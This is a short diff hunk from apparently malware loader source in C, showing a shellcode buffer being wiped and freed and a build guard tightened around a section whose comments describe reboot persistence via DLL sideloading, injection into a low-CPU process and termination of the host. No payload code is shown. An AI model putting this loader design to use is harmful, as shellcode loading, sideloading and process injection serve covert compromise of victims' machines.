@@ -214,7 +214,7 @@ int Main(VOID) {
     MemSet(pShellcode, 0, dwShellcodeSize);
     HeapFree(GetProcessHeap(), 0, pShellcode);
 
-#ifdef BUILD_DLL
+#if defined(BUILD_DLL) && defined(ENABLE_INJECT)
     // --- Persistence-reboot: inject into low-CPU process, terminate host ---
     // On first run SideloadInstallAndContinue terminates us before we reach this
     // point. On reboot the host EXE is relaunched with /pf, meaning we are running
